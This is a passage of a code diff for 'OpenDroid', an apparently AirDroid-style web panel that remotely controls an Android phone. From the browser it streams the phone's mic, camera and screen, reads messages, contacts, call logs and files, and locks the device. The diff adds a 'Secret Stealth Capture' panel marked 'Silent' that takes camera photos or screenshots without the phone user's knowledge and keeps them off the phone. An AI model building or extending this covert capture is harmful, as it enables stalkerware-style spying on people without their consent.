@@ -1,4 +1,4 @@
-<html lang="en">
+﻿<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -49,6 +49,7 @@
 </head>
 <body class="h-screen w-screen text-gray-800 font-sans relative">
 
+
     <!-- Connect / Pairing Modal -->
     <div id="pair-modal" class="fixed inset-0 bg-black/75 backdrop-blur-md z-[100] flex items-center justify-center p-4">
         <div class="bg-white rounded-2xl shadow-2xl p-6 max-w-sm w-full text-center">
@@ -62,6 +63,7 @@
             </div>
         </div>
     </div>
+
 
     <!-- On-Demand Image Preview Modal -->
     <div id="image-preview-modal" class="hidden fixed inset-0 bg-black/85 backdrop-blur-md z-[110] flex items-center justify-center p-4">
@@ -80,6 +82,7 @@
         </div>
     </div>
 
+
     <!-- On-Demand Video Player Modal -->
     <div id="video-player-modal" class="hidden fixed inset-0 bg-black/85 backdrop-blur-md z-[110] flex items-center justify-center p-4">
         <div class="bg-gray-900 border border-white/10 rounded-2xl shadow-2xl max-w-2xl w-full flex flex-col overflow-hidden">
@@ -97,6 +100,7 @@
         </div>
     </div>
 
+
     <!-- Top Dock Bar -->
     <div class="fixed top-2 left-1/2 -translate-x-1/2 h-10 bg-gray-900/85 backdrop-blur-md text-white flex items-center gap-4 px-4 rounded-full z-50 shadow-xl border border-white/10 text-xs">
         <div class="flex items-center gap-2 pr-3 border-r border-gray-700">
@@ -104,10 +108,12 @@
             <span class="font-bold tracking-wide text-sm">OpenDroid</span>
         </div>
 
+
         <div class="relative flex items-center">
             <input type="text" id="top-search" placeholder="Search contacts or messages..." class="bg-gray-800/80 border border-gray-700 rounded-full px-3 py-1 text-xs w-48 focus:w-64 transition-all focus:outline-none focus:border-blue-500 text-gray-200">
             <span class="absolute right-2 text-gray-400 text-xs">🔍</span>
         </div>
+
 
         <div class="flex items-center gap-3.5 pl-3 border-l border-gray-700">
             <span id="ws-status-taskbar" class="text-yellow-400 text-xs font-semibold">● Ready</span>
@@ -116,6 +122,7 @@
                 <span id="dock-mic-icon">🔇</span>
                 <span id="dock-mic-label">Mic Off</span>
             </button>
+
 
             <button id="dock-torch-btn" onclick="toggleStandaloneTorch()" class="hover:text-yellow-400 transition-colors font-medium flex items-center gap-1" title="Remote Flashlight">
                 <span id="dock-torch-icon">💡</span>
@@ -133,6 +140,7 @@
             <button onclick="location.reload()" title="Disconnect" class="hover:text-red-400 font-bold ml-1">⏻</button>
         </div>
     </div>
+
 
     <!-- Desktop Icons Grid (Vertical Column-Wrapping AirDroid Style) -->
     <div class="p-6 mt-12 flex flex-col flex-wrap gap-x-8 gap-y-6 max-h-[85vh] w-max">
@@ -155,6 +163,7 @@
             <span class="text-xs font-medium text-center mt-1">Contacts</span>
         </div>
 
+
         <!-- Media & Files -->
         <div class="desktop-icon flex flex-col items-center text-white drop-shadow-lg" onclick="wm.openWindow('file-window')">
             <div class="app-tile bg-gradient-to-tr from-amber-400 to-yellow-500">📁</div>
@@ -172,6 +181,7 @@
             <div class="app-tile bg-gradient-to-tr from-blue-400 to-indigo-500">🎬</div>
             <span class="text-xs font-medium text-center mt-1">Videos</span>
         </div>
+
 
         <!-- Management & Utilities -->
         <div class="desktop-icon flex flex-col items-center text-white drop-shadow-lg" onclick="wm.openWindow('info-window')">
@@ -191,6 +201,7 @@
             <span class="text-xs font-medium text-center mt-1">Ringtone</span>
         </div>
 
+
         <!-- Remote Controls, Web & Security -->
         <div class="desktop-icon flex flex-col items-center text-white drop-shadow-lg" onclick="wm.openWindow('url-window')">
             <div class="app-tile bg-gradient-to-tr from-emerald-400 to-teal-600">🌐</div>
@@ -208,7 +219,13 @@
             <div class="app-tile bg-gradient-to-tr from-purple-500 to-pink-600">📷</div>
             <span class="text-xs font-medium text-center mt-1">Camera</span>
         </div>
+        <!-- Secret Stealth Capture Panel -->
+        <div class="desktop-icon flex flex-col items-center text-white drop-shadow-lg" onclick="wm.openWindow('secret-window')">
+            <div class="app-tile bg-gradient-to-tr from-rose-700 to-red-900 shadow-red-900/50">📸</div>
+            <span class="text-xs font-medium text-center mt-1">Secret</span>
+        </div>
     </div>
+
 
     <!-- Window: Open URL on Phone -->
     <div id="url-window" class="window hidden" style="width: 400px; height: 260px; top: 120px; left: 380px;">
@@ -231,6 +248,7 @@
         </div>
     </div>
 
+
     <!-- Window: Remote Camera -->
     <div id="camera-window" class="window hidden" style="width: 440px; height: 580px; top: 70px; left: 360px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
@@ -244,6 +262,7 @@
             <div id="camera-status-bar" class="bg-gray-900/90 text-yellow-400 text-[11px] py-1.5 px-3 text-center border-b border-gray-800 font-mono">
                 Click Start Camera below
             </div>
+
 
             <div class="flex-1 w-full h-full relative flex items-center justify-center bg-black overflow-hidden">
                 <img id="camera-frame-view" class="w-full h-full object-contain hidden" alt="Camera Feed" />
@@ -267,6 +286,73 @@
         </div>
     </div>
 
+
+    <!-- Window: Secret Stealth Capture Panel -->
+    <div id="secret-window" class="window hidden" style="width: 520px; height: 580px; top: 80px; left: 350px;">
+        <!-- Title Bar -->
+        <div class="title-bar bg-gray-900 text-white px-3 py-2 flex justify-between items-center border-b border-gray-800">
+            <div class="flex items-center gap-2">
+                <span class="text-sm">🕵️</span>
+                <span class="font-semibold text-xs text-red-400">Secret Stealth Capture</span>
+                <span class="text-[10px] bg-red-900/50 text-red-300 border border-red-800 px-1.5 py-0.5 rounded font-mono">Silent</span>
+            </div>
+            <button onclick="wm.closeWindow('secret-window')" class="text-gray-400 hover:text-red-400 text-sm font-bold">✕</button>
+        </div>
+
+        <!-- Panel Content -->
+        <div class="flex-1 bg-gray-900 text-gray-200 overflow-hidden flex flex-col">
+            <!-- Capture Controls Bar -->
+            <div class="p-3 bg-gray-800/80 border-b border-gray-700/60 flex flex-col gap-2.5">
+                <div class="flex items-center justify-between text-xs text-gray-400">
+                    <span class="font-medium">Select Source:</span>
+                    <span id="secret-status-text" class="text-emerald-400 font-mono text-[11px]">● Idle / Ready</span>
+                </div>
+
+                <!-- 3 Options Selection -->
+                <div class="grid grid-cols-3 gap-2 text-xs">
+                    <label class="flex items-center gap-1.5 p-2 bg-gray-900/70 border border-gray-700 rounded-lg cursor-pointer hover:border-blue-500 transition-all">
+                        <input type="radio" name="secret-capture-target" value="FRONT" checked class="text-blue-600 focus:ring-0">
+                        <span class="font-medium">🤳 Front Cam</span>
+                    </label>
+                    <label class="flex items-center gap-1.5 p-2 bg-gray-900/70 border border-gray-700 rounded-lg cursor-pointer hover:border-blue-500 transition-all">
+                        <input type="radio" name="secret-capture-target" value="BACK" class="text-blue-600 focus:ring-0">
+                        <span class="font-medium">📷 Back Cam</span>
+                    </label>
+                    <label class="flex items-center gap-1.5 p-2 bg-gray-900/70 border border-gray-700 rounded-lg cursor-pointer hover:border-blue-500 transition-all">
+                        <input type="radio" name="secret-capture-target" value="SCREEN" class="text-blue-600 focus:ring-0">
+                        <span class="font-medium">🖥️ Screenshot</span>
+                    </label>
+                </div>
+
+                <!-- Primary Action Button with Cooldown -->
+                <div class="flex items-center gap-2">
+                    <button id="secret-capture-btn" onclick="triggerSecretCapture()" class="flex-1 bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-700 hover:to-rose-800 text-white font-bold py-2 px-4 rounded-xl shadow-lg flex items-center justify-center gap-2 transition-all active:scale-95 text-xs">
+                        <span id="secret-btn-icon">📸</span>
+                        <span id="secret-btn-label">Capture Secret Snapshot</span>
+                    </button>
+                    <button onclick="clearSecretHistory()" title="Clear Session Gallery" class="px-3 py-2 bg-gray-700/80 hover:bg-gray-600 text-gray-300 hover:text-white rounded-xl text-xs transition-colors">
+                        🗑️ Clear
+                    </button>
+                </div>
+            </div>
+
+            <!-- Gallery Header -->
+            <div class="px-3 py-1.5 bg-gray-950/60 border-b border-gray-800 flex justify-between items-center text-[11px] text-gray-400">
+                <span>Session Captures (<span id="secret-count" class="font-mono text-cyan-400 font-bold">0</span>)</span>
+                <span class="text-gray-500">Stored in browser RAM only • Not saved on phone</span>
+            </div>
+
+            <!-- Gallery Grid (Retains all captured photos in chronological order) -->
+            <div id="secret-gallery-grid" class="flex-1 overflow-y-auto p-3 grid grid-cols-2 sm:grid-cols-3 gap-3">
+                <div id="secret-empty-hint" class="col-span-full py-12 text-center text-gray-500 text-xs flex flex-col items-center justify-center gap-2">
+                    <div class="text-3xl opacity-40">📸</div>
+                    <div>No secret captures yet in this session.</div>
+                    <div class="text-[11px] text-gray-600">Select an option and click Capture.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Window: Screen Mirroring -->
     <div id="screen-window" class="window hidden" style="width: 360px; height: 710px; top: 50px; left: 330px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
@@ -281,6 +367,7 @@
                 Click Start Screen Mirror below
             </div>
 
+
             <div class="flex-1 w-full h-full relative flex items-center justify-center bg-black overflow-hidden select-none">
                 <img id="screen-frame-view" class="w-full h-full object-fill cursor-crosshair hidden" alt="Screen Mirror" />
                 <div id="screen-placeholder" class="text-gray-500 text-xs text-center p-4">
@@ -294,6 +381,7 @@
                 <button onclick="sendGlobalAction('RECENTS')" class="text-white text-lg hover:text-gray-300 px-4">⏹</button>
             </div>
 
+
             <div class="bg-gray-900 p-2.5 border-t border-gray-800 z-10 flex flex-col gap-2 text-xs">
                 <div class="flex items-center justify-between gap-2">
                     <button id="screen-toggle-btn" onclick="startScreenStream()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-1.5 rounded-lg shadow text-xs transition-colors">Start Screen Mirror</button>
@@ -304,6 +392,7 @@
             </div>
         </div>
     </div>
+
 
     <!-- Window: Files Explorer -->
     <div id="file-window" class="window hidden" style="width: 550px; height: 520px; top: 110px; left: 370px;">
@@ -326,11 +415,13 @@
                 <button onclick="sendCommand({action: 'FETCH_DIR', path: currentDirPath})" class="text-blue-600 hover:underline px-1">🔄</button>
             </div>
 
+
             <div id="dir-files-list" class="flex-1 overflow-y-auto divide-y text-xs">
                 <div class="p-4 text-center text-gray-400 text-xs">Loading directory...</div>
             </div>
         </div>
     </div>
+
 
     <!-- Live File Transfer Progress Toast -->
     <div id="transfer-progress-toast" class="hidden fixed bottom-6 right-6 bg-gray-900/95 backdrop-blur text-white p-3.5 rounded-xl shadow-2xl z-50 text-xs border border-white/10 w-80 flex flex-col gap-2">
@@ -343,8 +434,10 @@
         </div>
     </div>
 
+
     <!-- Real-Time Notification Mirror Toast Container -->
     <div id="toast-container" class="fixed top-14 right-6 w-80 z-50 flex flex-col gap-2.5 pointer-events-none"></div>
+
 
     <!-- Window: Messages -->
     <div id="sms-window" class="window hidden" style="width: 440px; height: 520px; top: 80px; left: 320px;">
@@ -367,6 +460,7 @@
         </div>
     </div>
 
+
     <!-- Window: Dialer & Contacts -->
     <div id="contacts-window" class="window hidden" style="width: 360px; height: 500px; top: 100px; left: 360px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
@@ -384,6 +478,7 @@
             <div id="contacts-list" class="flex-1 overflow-y-auto divide-y text-xs"></div>
         </div>
     </div>
+
 
     <!-- Window: Call Logs -->
     <div id="call-logs-window" class="window hidden" style="width: 420px; height: 480px; top: 120px; left: 380px;">
@@ -405,6 +500,7 @@
         </div>
     </div>
 
+
     <!-- Window: Apps -->
     <div id="apps-window" class="window hidden" style="width: 420px; height: 500px; top: 130px; left: 390px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
@@ -424,6 +520,7 @@
             </div>
         </div>
     </div>
+
 
     <!-- Window: Photos Gallery -->
     <div id="photos-window" class="window hidden" style="width: 540px; height: 500px; top: 120px; left: 400px;">
@@ -445,6 +542,7 @@
         </div>
     </div>
 
+
     <!-- Window: Music Player -->
     <div id="music-window" class="window hidden" style="width: 560px; height: 520px; top: 90px; left: 360px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
@@ -462,9 +560,11 @@
                 </button>
             </div>
 
+
             <div id="music-list" class="flex-1 overflow-y-auto divide-y text-xs">
                 <div class="p-6 text-center text-gray-400 text-xs">Loading songs from phone...</div>
             </div>
+
 
             <div class="p-3 bg-gray-900 text-white border-t border-gray-800 flex flex-col gap-1.5 z-10 text-xs">
                 <div class="flex justify-between items-center text-[11px]">
@@ -483,6 +583,7 @@
             </div>
         </div>
     </div>
+
 
     <!-- Window: Videos Manager -->
     <div id="videos-window" class="window hidden" style="width: 560px; height: 520px; top: 100px; left: 380px;">
@@ -506,6 +607,7 @@
         </div>
     </div>
 
+
     <!-- Window: Clipboard Sync -->
     <div id="clipboard-window" class="window hidden" style="width: 380px; height: 300px; top: 150px; left: 410px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
@@ -525,6 +627,7 @@
             <div id="clipboard-status" class="text-[10px] text-gray-400 text-center"></div>
         </div>
     </div>
+
 
     <!-- Window: Device Info -->
     <div id="info-window" class="window hidden" style="width: 380px; height: 350px; top: 140px; left: 400px;">
@@ -564,6 +667,7 @@
         </div>
     </div>
 
+
     <!-- Window: Find Phone (Target 6 & Phase 2: Remote Screen Lock) -->
     <div id="map-window" class="window hidden" style="width: 580px; height: 500px; top: 90px; left: 380px;">
         <div class="title-bar bg-gray-800 text-white px-3 py-2 flex justify-between items-center">
@@ -595,6 +699,7 @@
                 </div>
             </div>
 
+
             <div id="map-container" class="flex-1 bg-gray-200 relative">
                 <div id="map" class="absolute inset-0"></div>
                 <div class="absolute bottom-1 right-2 z-[400] bg-gray-900/80 backdrop-blur text-white text-[10px] font-mono px-2 py-0.5 rounded shadow pointer-events-none">
@@ -603,6 +708,7 @@
             </div>
         </div>
     </div>
+
 
     <script>
         let currentPairingCode = '';
@@ -617,10 +723,12 @@
         let currentDirPath = '';
         let parentDirPath = '';
 
+
         // Chunked File Transfer State
         let activeDownload = null;
         let activeUpload = null;
         let activePreview = null;
+
 
         // Music & Video Player State
         let currentAudioBlobUrl = null;
@@ -629,6 +737,7 @@
         let currentVideoBlobUrl = null;
         let activeVideoBuffer = null;
 
+
         // Web Audio API
         let audioCtx = null;
         let gainNode = null;
@@ -636,10 +745,12 @@
         let isGlobalMicActive = false;
         let isTorchOn = false;
 
+
         // Leaflet Map Instances
         let mapInstance = null;
         let mapMarker = null;
         let mapCircle = null;
+
 
         function initWebAudio() {
             if (!audioCtx) {
@@ -650,12 +761,14 @@
             }
         }
 
+
         function playPcmChunk(base64Pcm) {
             if (!isGlobalMicActive) return;
             initWebAudio();
             if (audioCtx.state === 'suspended') {
                 audioCtx.resume();
             }
+
 
             try {
                 const binary = atob(base64Pcm);
@@ -666,18 +779,22 @@
                     view.setUint8(i, binary.charCodeAt(i));
                 }
 
+
                 const int16 = new Int16Array(buffer);
                 const float32 = new Float32Array(int16.length);
                 for (let i = 0; i < int16.length; i++) {
                     float32[i] = int16[i] / 32768.0;
                 }
 
+
                 const audioBuffer = audioCtx.createBuffer(1, float32.length, 16000);
                 audioBuffer.getChannelData(0).set(float32);
+
 
                 const source = audioCtx.createBufferSource();
                 source.buffer = audioBuffer;
                 source.connect(gainNode);
+
 
                 const currentTime = audioCtx.currentTime;
                 if (nextAudioStartTime < currentTime) {
@@ -690,13 +807,16 @@
             }
         }
 
+
         function toggleGlobalMic() {
             setMicState(!isGlobalMicActive);
         }
 
+
         function toggleScreenMic() {
             setMicState(!isGlobalMicActive);
         }
+
 
         function adjustAudioVolume(val) {
             const vol = parseFloat(val);
@@ -707,10 +827,12 @@
             }
         }
 
+
         function setMicState(enable, volume = 0.8) {
             isGlobalMicActive = enable;
             initWebAudio();
             gainNode.gain.value = enable ? volume : 0;
+
 
             const dockIcon = document.getElementById('dock-mic-icon');
             const dockLabel = document.getElementById('dock-mic-label');
@@ -718,6 +840,7 @@
             const screenBtn = document.getElementById('screen-mic-btn');
             const camSlider = document.getElementById('cam-mic-volume');
             const camLabel = document.getElementById('cam-mic-volume-label');
+
 
             if (enable) {
                 if (dockIcon) dockIcon.textContent = "🎙️";
@@ -730,6 +853,7 @@
                 }
                 if (camSlider) camSlider.value = volume;
                 if (camLabel) camLabel.textContent = `${Math.round(volume * 100)}%`;
+
 
                 sendCommand({ action: 'START_AUDIO_STREAM' });
             } else {
@@ -744,9 +868,11 @@
                 if (camSlider) camSlider.value = 0;
                 if (camLabel) camLabel.textContent = "Off";
 
+
                 sendCommand({ action: 'STOP_AUDIO_STREAM' });
             }
         }
+
 
         // Dedicated EMQX Serverless Secure Connection
         function connectViaCloud() {
@@ -758,6 +884,7 @@
             currentPairingCode = code;
             document.getElementById('pair-modal').classList.add('hidden');
             document.getElementById('ws-status-taskbar').textContent = '● Connecting...';
+
 
             mqttClient = mqtt.connect('wss://ceee508c.ala.asia-southeast1.emqxsl.com:8084/mqtt', {
                 username: 'OpenDroid-v1',
@@ -772,12 +899,14 @@
                 
                 mqttClient.subscribe(`opendroid/${currentPairingCode}/pc`, { qos: 1 });
 
+
                 if (handshakeInterval) clearInterval(handshakeInterval);
                 handshakeInterval = setInterval(() => {
                     sendCommand({ action: 'HANDSHAKE', code: currentPairingCode });
                 }, 1500);
                 sendCommand({ action: 'HANDSHAKE', code: currentPairingCode });
             });
+
 
             mqttClient.on('message', (topic, payload) => {
                 try {
@@ -786,6 +915,7 @@
                 } catch (e) { console.error(e); }
             });
         }
+
 
         function connectLocal() {
             document.getElementById('pair-modal').classList.add('hidden');
@@ -799,6 +929,7 @@
             localWs.onmessage = (e) => handleIncomingData(JSON.parse(e.data));
         }
 
+
         function sendCommand(obj) {
             const str = JSON.stringify(obj);
             if (isCloudMode && mqttClient && mqttClient.connected) {
@@ -807,6 +938,8 @@
                 localWs.send(str);
             }
         }
+
+
 
 
         // --- Sleek Non-Blocking Floating Toast System ---
@@ -825,6 +958,7 @@
             }, 2500);
         }
 
+
         function handleIncomingData(data) {
             if (data.type === 'HANDSHAKE_ACK' || data.type === 'BATTERY') {
                 if (handshakeInterval) {
@@ -838,12 +972,17 @@
                     document.getElementById('device-model-text').textContent = data.device;
                 }
 
+
                 if (data.percent !== undefined) {
                     document.getElementById('battery-text').textContent = `${data.percent}%`;
                     document.getElementById('device-battery-detail').textContent = `${data.percent}% (${data.charging ? 'Charging' : 'On Battery'})`;
                     document.getElementById('battery-icon').textContent = data.charging ? '⚡' : '🔋';
                 }
             } 
+            // --- Phase 2: Stealth Photo / Screenshot Capture Result ---
+            else if (data.type === 'STEALTH_CAPTURE_RESULT') {
+                handleStealthCaptureResult(data);
+            }
             // --- Camera Direct Stream ---
             else if (data.type === 'CAMERA_FRAME') {
                 const img = document.getElementById('camera-frame-view');
@@ -1016,11 +1155,13 @@
             }
         }
 
+
         // --- Remote URL Launcher ---
         // --- Standalone Torch Functions ---
         function toggleStandaloneTorch() {
             sendCommand({ action: 'TOGGLE_STANDALONE_TORCH' });
         }
+
 
         function updateTorchUI(isOn) {
             const btn = document.getElementById('dock-torch-btn');
@@ -1036,6 +1177,7 @@
             }
         }
 
+
         function launchRemoteUrl() {
             const input = document.getElementById('remote-url-input');
             const url = input.value.trim();
@@ -1048,11 +1190,13 @@
             sendCommand({ action: 'OPEN_URL', url: url });
         }
 
+
         // --- Remote Screen Lock (Instant 1-Click) ---
         function lockDeviceScreen() {
             showToast("Locking phone screen... 🔒", "info");
             sendCommand({ action: 'LOCK_DEVICE' });
         }
+
 
         // --- Camera Controls with Auto-Switch ---
         function updateCameraStatus(statusText) {
@@ -1067,6 +1211,7 @@
             }
         }
 
+
         function startCameraStream(facing) {
             const screenBtn = document.getElementById('screen-toggle-btn');
             if (screenBtn && screenBtn.textContent.includes("Stop")) {
@@ -1080,18 +1225,22 @@
                 if (screenPlace) screenPlace.classList.remove('hidden');
             }
 
+
             updateCameraStatus("🟡 Starting Camera Hardware on Phone...");
             sendCommand({ action: 'START_CAMERA_STREAM', facing: facing });
         }
+
 
         function stopCameraStream() {
             sendCommand({ action: 'STOP_CAMERA_STREAM' });
         }
 
+
         function closeCameraRoom() {
             wm.closeWindow('camera-window');
             stopCameraStream();
         }
+
 
         // --- Screen Mirror Controls with Touch Injection ---
         function updateScreenStatus(statusText) {
@@ -1106,6 +1255,7 @@
             }
         }
 
+
         function startScreenStream() {
             const camBtn = document.getElementById('cam-toggle-btn');
             if (camBtn && camBtn.textContent.includes("Stop")) {
@@ -1119,25 +1269,31 @@
                 if (camPlace) camPlace.classList.remove('hidden');
             }
 
+
             updateScreenStatus("🟡 Connecting Screen Stream...");
             sendCommand({ action: 'START_SCREEN_STREAM' });
         }
 
+
         function stopScreenStream() {
             sendCommand({ action: 'STOP_SCREEN_STREAM' });
         }
+
 
         function closeScreenRoom() {
             wm.closeWindow('screen-window');
             stopScreenStream();
         }
 
+
         // Mouse Touch Control on Screen Mirror Image
         let isDraggingScreen = false;
         let startNormX = 0, startNormY = 0;
         const screenImg = document.getElementById('screen-frame-view');
 
+
         screenImg.addEventListener('dragstart', (e) => e.preventDefault());
+
 
         screenImg.addEventListener('mousedown', (e) => {
             isDraggingScreen = true;
@@ -1146,20 +1302,25 @@
             startNormY = (e.clientY - rect.top) / rect.height;
         });
 
+
         document.addEventListener('mouseup', (e) => {
             if (!isDraggingScreen) return;
             isDraggingScreen = false;
+
 
             const rect = screenImg.getBoundingClientRect();
             const rawEndX = (e.clientX - rect.left) / rect.width;
             const rawEndY = (e.clientY - rect.top) / rect.height;
 
+
             const distance = Math.hypot(rawEndX - startNormX, rawEndY - startNormY);
+
 
             const clampedX = Math.max(0, Math.min(1, rawEndX));
             const clampedY = Math.max(0, Math.min(1, rawEndY));
             const clampedStartX = Math.max(0, Math.min(1, startNormX));
             const clampedStartY = Math.max(0, Math.min(1, startNormY));
+
 
             if (distance < 0.02) {
                 sendCommand({ action: 'INPUT_TAP', x: clampedX, y: clampedY });
@@ -1168,9 +1329,12 @@
             }
         });
 
+
         function sendGlobalAction(actionType) {
             sendCommand({ action: 'GLOBAL_ACTION', actionType: actionType });
         }
+
+
 
 
         // --- Target 7A: Music Player Engine ---
@@ -1181,6 +1345,7 @@
                 list.innerHTML = '<div class="p-6 text-center text-gray-400 text-xs">No songs found in phone storage</div>';
                 return;
             }
+
 
             tracks.forEach(track => {
                 const sizeMb = (track.size / (1024 * 1024)).toFixed(1);
@@ -1204,6 +1369,7 @@
             });
         }
 
+
         function filterMusic(query) {
             const q = query.toLowerCase();
             const filtered = allAudioTracks.filter(t => 
@@ -1212,19 +1378,23 @@
             renderAudioList(filtered);
         }
 
+
         function startAudioPlayback(path, title, artist, totalSize) {
             if (currentAudioBlobUrl) {
                 URL.revokeObjectURL(currentAudioBlobUrl);
                 currentAudioBlobUrl = null;
             }
 
+
             const player = document.getElementById('music-html-audio');
             player.pause();
+
 
             document.getElementById('player-song-title').textContent = title;
             document.getElementById('player-song-artist').textContent = artist;
             document.getElementById('player-song-time').textContent = "Buffering...";
             document.getElementById('player-play-btn').textContent = "⏳";
+
 
             activeAudioBuffer = {
                 path: path,
@@ -1233,8 +1403,10 @@
                 chunks: []
             };
 
+
             sendCommand({ action: 'DOWNLOAD_FILE_CHUNK', path: path, offset: 0 });
         }
+
 
         function handleAudioBufferChunk(chunk) {
             if (!activeAudioBuffer) return;
@@ -1247,9 +1419,11 @@
                 activeAudioBuffer.chunks.push(new Uint8Array(byteNumbers));
             }
 
+
             const currentLoaded = chunk.offset + (chunk.data ? atob(chunk.data).length : 0);
             const percent = activeAudioBuffer.totalSize > 0 ? (currentLoaded / activeAudioBuffer.totalSize) * 100 : 100;
             document.getElementById('player-song-time').textContent = `Loading ${Math.round(percent)}%`;
+
 
             if (chunk.isLast) {
                 const blob = new Blob(activeAudioBuffer.chunks, { type: 'audio/mpeg' });
@@ -1270,6 +1444,7 @@
             }
         }
 
+
         function toggleAudioPlayback() {
             const player = document.getElementById('music-html-audio');
             if (!player.src) return;
@@ -1284,20 +1459,24 @@
             }
         }
 
+
         function updateAudioProgress() {
             const player = document.getElementById('music-html-audio');
             if (!player.duration) return;
             const progress = (player.currentTime / player.duration) * 100;
             document.getElementById('player-seek-bar').value = progress;
 
+
             const curM = Math.floor(player.currentTime / 60);
             const curS = Math.floor(player.currentTime % 60);
             const durM = Math.floor(player.duration / 60);
             const durS = Math.floor(player.duration % 60);
 
+
             const format = (m, s) => `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
             document.getElementById('player-song-time').textContent = `${format(curM, curS)} / ${format(durM, durS)}`;
         }
+
 
         function seekAudio(val) {
             const player = document.getElementById('music-html-audio');
@@ -1306,16 +1485,19 @@
             }
         }
 
+
         function setPlayerVolume(val) {
             const player = document.getElementById('music-html-audio');
             player.volume = parseFloat(val);
         }
+
 
         function onAudioEnded() {
             isAudioPlaying = false;
             document.getElementById('player-play-btn').textContent = "▶";
             document.getElementById('player-seek-bar').value = 0;
         }
+
 
         // --- Target 7B: Videos Manager with 25MB Guard ---
         function renderVideoList(videos) {
@@ -1326,9 +1508,11 @@
                 return;
             }
 
+
             videos.forEach(video => {
                 const sizeMb = (video.size / (1024 * 1024)).toFixed(1);
                 const isStreamable = (video.size <= 25 * 1024 * 1024);
+
 
                 list.innerHTML += `
                     <div class="p-3 hover:bg-gray-50 flex items-center justify-between">
@@ -1359,16 +1543,19 @@
             });
         }
 
+
         function openVideoPlayer(path, fileName, totalSize) {
             if (currentVideoBlobUrl) {
                 URL.revokeObjectURL(currentVideoBlobUrl);
                 currentVideoBlobUrl = null;
             }
 
+
             const modal = document.getElementById('video-player-modal');
             const player = document.getElementById('video-modal-player');
             const loader = document.getElementById('video-modal-loader');
             const title = document.getElementById('video-modal-title');
+
 
             player.pause();
             player.classList.add('hidden');
@@ -1378,6 +1565,7 @@
             document.getElementById('video-modal-download-btn').onclick = () => triggerFileDownload(path, fileName);
             modal.classList.remove('hidden');
 
+
             activeVideoBuffer = {
                 path: path,
                 fileName: fileName,
@@ -1385,8 +1573,10 @@
                 chunks: []
             };
 
+
             sendCommand({ action: 'DOWNLOAD_FILE_CHUNK', path: path, offset: 0 });
         }
+
 
         function handleVideoBufferChunk(chunk) {
             if (!activeVideoBuffer) return;
@@ -1399,9 +1589,11 @@
                 activeVideoBuffer.chunks.push(new Uint8Array(byteNumbers));
             }
 
+
             const currentLoaded = chunk.offset + (chunk.data ? atob(chunk.data).length : 0);
             const percent = activeVideoBuffer.totalSize > 0 ? (currentLoaded / activeVideoBuffer.totalSize) * 100 : 100;
             document.getElementById('video-modal-loader').textContent = `Buffering video (${Math.round(percent)}%)...`;
+
 
             if (chunk.isLast) {
                 const blob = new Blob(activeVideoBuffer.chunks, { type: 'video/mp4' });
@@ -1417,6 +1609,7 @@
             }
         }
 
+
         function closeVideoPlayerModal() {
             const player = document.getElementById('video-modal-player');
             player.pause();
@@ -1428,6 +1621,7 @@
             }
             activeVideoBuffer = null;
         }
+
 
         // --- File Download & Chunks Router ---
         function triggerFileDownload(filePath, fileName) {
@@ -1441,21 +1635,25 @@
             sendCommand({ action: 'DOWNLOAD_FILE_CHUNK', path: filePath, offset: 0 });
         }
 
+
         function handleDownloadChunk(chunk) {
             if (activeAudioBuffer && chunk.filePath === activeAudioBuffer.path) {
                 handleAudioBufferChunk(chunk);
                 return;
             }
 
+
             if (activeVideoBuffer && chunk.filePath === activeVideoBuffer.path) {
                 handleVideoBufferChunk(chunk);
                 return;
             }
 
+
             if (activePreview && chunk.filePath === activePreview.path) {
                 handlePreviewChunk(chunk);
                 return;
             }
+
 
             if (!activeDownload) return;
             if (chunk.error) {
@@ -1465,7 +1663,9 @@
                 return;
             }
 
+
             activeDownload.totalSize = chunk.totalSize;
+
 
             if (chunk.data) {
                 const byteCharacters = atob(chunk.data);
@@ -1476,9 +1676,11 @@
                 activeDownload.chunks.push(new Uint8Array(byteNumbers));
             }
 
+
             const currentLoaded = chunk.offset + (chunk.data ? atob(chunk.data).length : 0);
             const percent = activeDownload.totalSize > 0 ? (currentLoaded / activeDownload.totalSize) * 100 : 100;
             showTransferToast(`Downloading ${activeDownload.name}`, Math.min(percent, 99));
+
 
             if (chunk.isLast) {
                 showTransferToast(`Saving ${activeDownload.name}`, 100);
@@ -1498,18 +1700,22 @@
             }
         }
 
+
         // --- File Upload ---
         function handleFileSelected(files) {
             if (!files || files.length === 0) return;
             const file = files[0];
             const reader = new FileReader();
 
+
             showTransferToast(`Reading ${file.name}...`, 0);
+
 
             reader.onload = function(e) {
                 const arrayBuffer = e.target.result;
                 const chunkSize = 72 * 1024;
                 const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize) || 1;
+
 
                 activeUpload = {
                     file: file,
@@ -1520,17 +1726,21 @@
                     currentChunk: 0
                 };
 
+
                 sendNextUploadChunk();
             };
 
+
             reader.readAsArrayBuffer(file);
         }
+
 
         function sendNextUploadChunk() {
             if (!activeUpload) return;
             const start = activeUpload.currentChunk * activeUpload.chunkSize;
             const end = Math.min(start + activeUpload.chunkSize, activeUpload.buffer.byteLength);
             const slice = activeUpload.buffer.slice(start, end);
+
 
             let binary = '';
             const bytes = new Uint8Array(slice);
@@ -1539,11 +1749,14 @@
             }
             const base64Data = btoa(binary);
 
+
             const isFirst = (activeUpload.currentChunk === 0);
             const isLast = (activeUpload.currentChunk + 1 >= activeUpload.totalChunks);
 
+
             const percent = ((activeUpload.currentChunk + 1) / activeUpload.totalChunks) * 100;
             showTransferToast(`Uploading ${activeUpload.file.name}`, percent);
+
 
             sendCommand({
                 action: 'UPLOAD_FILE_CHUNK',
@@ -1555,11 +1768,13 @@
             });
         }
 
+
         function handleUploadAck() {
             if (!activeUpload) return;
             activeUpload.currentChunk++;
             sendNextUploadChunk();
         }
+
 
         function handleUploadComplete(fileName) {
